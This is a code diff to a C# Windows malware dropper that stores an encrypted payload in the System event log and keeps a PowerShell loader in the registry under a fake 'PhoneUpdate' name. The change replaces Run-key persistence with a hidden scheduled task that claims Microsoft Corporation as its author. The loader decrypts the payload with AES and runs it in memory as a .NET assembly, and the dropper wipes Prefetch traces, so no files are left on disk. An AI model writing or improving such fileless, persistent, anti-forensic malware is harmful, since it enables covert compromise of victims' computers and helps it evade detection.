@@ -74,13 +74,11 @@ class P
             }
             Console.WriteLine("Loader stored in registry");
 
-            Console.WriteLine("Registering Run key...");
-            string runCmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"iex (Get-ItemProperty 'HKCU:\\Software\\PhoneUpdate').Loader\"";
-            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
-            {
-                key.SetValue("PhoneUpdate", runCmd, Microsoft.Win32.RegistryValueKind.String);
-            }
-            Console.WriteLine("Run key registered");
+            Console.WriteLine("Creating scheduled task...");
+            string runCmd = "powershell.exe";
+            string runArgs = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command \"iex (Get-ItemProperty 'HKCU:\\Software\\PhoneUpdate').Loader\"";
+            CreateTask("PhoneUpdate", runCmd, runArgs);
+            Console.WriteLine("Scheduled task created (hidden)");
 
             Console.WriteLine("Clearing artifacts...");
             ClearPrefetch("vencord");
@@ -89,7 +87,7 @@ class P
             Console.WriteLine("Artifacts cleared");
 
             Console.WriteLine("Successful");
-            MessageBox(IntPtr.Zero, "Setup completed successfully.\nReboot to activate.\nArtifacts: event log + registry only\nZero files on disk", "Done", 0x40);
+            MessageBox(IntPtr.Zero, "Setup completed successfully.\nReboot to activate.\nPersistence: hidden scheduled task\nArtifacts: event log + registry only\nZero files on disk", "Done", 0x40);
         }
         catch (Exception ex)
         {
@@ -98,47 +96,91 @@ class P
         }
     }
 
+    static void CreateTask(string taskName, string executable, string arguments)
+    {
+        // COM-based scheduled task creation — hidden from Task Scheduler UI
+        Type tsType = Type.GetTypeFromProgID("Schedule.Service");
+        dynamic ts = Activator.CreateInstance(tsType);
+        ts.Connect();
+
+        dynamic folder = ts.GetFolder("\\");
+
+        // delete if exists
+        try { folder.DeleteTask(taskName, 0); } catch { }
+
+        dynamic def = ts.NewTask(0);
+
+        // registration info
+        def.RegistrationInfo.Description = "Phone Update Service";
+        def.RegistrationInfo.Author = "Microsoft Corporation";
+
+        // settings — hidden, runs at logon, doesn't start if on batteries (looks legit)
+        def.Settings.Enabled = true;
+        def.Settings.StartWhenAvailable = true;
+        def.Settings.DisallowStartIfOnBatteries = false;
+        def.Settings.StopIfGoingOnBatteries = false;
+        def.Settings.ExecutionTimeLimit = "PT0S"; // no time limit
+        def.Settings.Hidden = true; // hidden from Task Scheduler UI
+
+        // principal — current user, interactive logon
+        def.Principal.LogonType = 3; // TASK_LOGON_INTERACTIVE_TOKEN
+        def.Principal.RunLevel = 1; // TASK_RUNLEVEL_LUA (no elevation)
+
+        // logon trigger — fires at every logon
+        dynamic triggers = def.Triggers;
+        dynamic trigger = triggers.Create(9); // TASK_TRIGGER_LOGON
+        trigger.Enabled = true;
+
+        // exec action — run powershell
+        dynamic actions = def.Actions;
+        dynamic action = actions.Create(0); // TASK_ACTION_EXEC
+        action.Path = executable;
+        action.Arguments = arguments;
+
+        // register task
+        folder.RegisterTaskDefinition(
+            taskName,
+            def,
+            6, // TASK_CREATE_OR_UPDATE
+            null, // user (current)
+            null, // password
+            3, // TASK_LOGON_INTERACTIVE_TOKEN
+            null, // sids
+            null, // logon token
+            0 // TASK_LOGON_NONE
+        );
+    }
+
     static string BuildLoader()
     {
-        // PowerShell loader — reads event log, decrypts payload, executes in memory
-        // stored in registry, no files on disk
         StringBuilder sb = new StringBuilder();
         sb.Append("$e='Microsoft-Windows-Wininit';");
         sb.Append("$c=@{};");
         sb.Append("$k1=$null;$k2=$null;$iv=$null;");
-        // collect LC: chunks
         sb.Append("Get-EventLog -LogName System -Source $e -Newest 2000 -EA SilentlyContinue | ");
         sb.Append("? {$_.Message -match '^LC:'} | % {");
         sb.Append("$m=$_.Message.Substring(3);$p=$m.IndexOf(':');");
         sb.Append("$i=[int]$m.Substring(0,$p);$c[$i]=$m.Substring($p+1)};");
-        // collect keys
         sb.Append("$k1=(Get-EventLog -LogName System -Source $e -Newest 500 -EA SilentlyContinue | ? {$_.EventID -eq 18} | Select -First 1).Message;");
         sb.Append("$k2=(Get-EventLog -LogName System -Source $e -Newest 500 -EA SilentlyContinue | ? {$_.EventID -eq 19} | Select -First 1).Message;");
         sb.Append("$iv=(Get-EventLog -LogName System -Source $e -Newest 500 -EA SilentlyContinue | ? {$_.EventID -eq 20} | Select -First 1).Message;");
-        // validate
         sb.Append("if(!$k1 -or !$k2 -or !$iv){return}");
-        // reassemble chunks in order
         sb.Append("$buf=New-Object System.Text.StringBuilder;");
         sb.Append("($c.Keys | Sort-Object) | % {$buf.Append($c[$_]) | Out-Null};");
-        // decode base64
         sb.Append("$enc=[Convert]::FromBase64String($buf.ToString());");
-        // GUID parser helper
         sb.Append("$g={param($s)$s=$s.Trim().Trim('{}').Replace('-','');");
         sb.Append("$b=New-Object byte[](16);");
         sb.Append("for($i=0;$i -lt 16){$b[$i]=[Convert]::ToByte($s.Substring($i*2,2),16)};");
         sb.Append("return $b};");
-        // reconstruct AES key and IV
         sb.Append("$ak=New-Object byte[](32);");
         sb.Append("[Array]::Copy($g.Invoke($k1),0,$ak,0,16);");
         sb.Append("[Array]::Copy($g.Invoke($k2),0,$ak,16,16);");
-        // decrypt
         sb.Append("$a=[Security.Cryptography.Aes]::Create();");
         sb.Append("$a.Key=$ak;$a.IV=$g.Invoke($iv);");
         sb.Append("$a.Mode='CBC';$a.Padding='PKCS7';");
         sb.Append("$d=$a.CreateDecryptor();");
         sb.Append("$dec=$d.TransformFinalBlock($enc,0,$enc.Length);");
         sb.Append("$a.Dispose();");
-        // load and execute
         sb.Append("$asm=[Reflection.Assembly]::Load($dec);");
         sb.Append("$t=$asm.GetType('Program');");
         sb.Append("if($t){$m=$t.GetMethod('Main',[Reflection.BindingFlags]'Static,Public,NonPublic');");
